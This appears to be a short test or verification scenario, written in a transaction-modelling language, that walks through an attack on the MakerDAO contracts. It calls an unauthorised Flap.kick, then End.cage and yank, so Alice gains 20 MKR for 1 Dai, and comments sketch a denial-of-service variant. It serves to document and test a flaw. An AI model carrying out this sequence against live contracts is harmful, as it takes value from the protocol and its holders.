// Attack Sequence
// ---------------

transact "Alice" Vat . move "Alice" Vow 1
transact "Bobby" GemJoin "gold" . join "Bobby" 1

transact "Alice" Vat . hope Flap
transact "Alice" Flap . kick 1 20 // step that shouldn't go through

transact ADMIN End . cage
transact "Alice" Flap . yank 1

// Now Alice has 20 MKR, at the cost of 1 Dai

// If the `End . cage` doesn't go through, Alice could still create dummy auctions to just burn MKR for low collateral amount.
// This would DoS the remaining auctions because they wouldn't have the MKR to pay out on finishing.
